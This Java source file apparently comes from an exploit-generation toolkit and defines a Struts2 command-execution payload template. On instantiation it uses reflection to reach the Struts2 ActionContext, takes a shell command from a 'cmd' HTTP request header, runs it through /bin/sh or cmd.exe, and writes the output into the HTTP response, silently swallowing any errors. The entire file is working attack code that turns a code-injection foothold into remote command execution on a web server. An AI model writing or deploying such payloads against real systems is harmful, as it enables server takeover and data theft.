package jeg.core.template.struts2;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class Struts2CmdExecTpl {

    private String getReqHeaderName() {
        return "cmd";
    }


    public Struts2CmdExecTpl() throws Exception {
        run();
    }

    public void run(){
        try {
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            Class actionContextClass = Class.forName("com.opensymphony.xwork2.ActionContext", false, loader);
            java.lang.reflect.Field filed = actionContextClass.getDeclaredField("actionContext");
            filed.setAccessible(true);
            ThreadLocal actionContext = (ThreadLocal) filed.get(null);
            Object con = actionContext.get();
            Object context = invokeMethod(con,"getContext");
            Object request = invokeMethod(context,"get", new Class[]{String.class},new Object[]{"com.opensymphony.xwork2.dispatcher.HttpServletRequest"});
            Object response = invokeMethod(context,"get", new Class[]{String.class},new Object[]{"com.opensymphony.xwork2.dispatcher.HttpServletResponse"});
            String cmd = (String) invokeMethod(request,"getHeader",new Class[]{String.class},new Object[]{getReqHeaderName()});
            if (cmd != null && !cmd.isEmpty()) {
                Writer writer = (Writer) invokeMethod(response, "getWriter");
                writer.write(exec(cmd));
                writer.flush();
                writer.close();
            }
        }catch (Exception ignored){
        }
    }


    public String exec(String cmd){
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        }catch (Exception e){
            return e.getMessage();
        }
    }

    private Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    private   Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
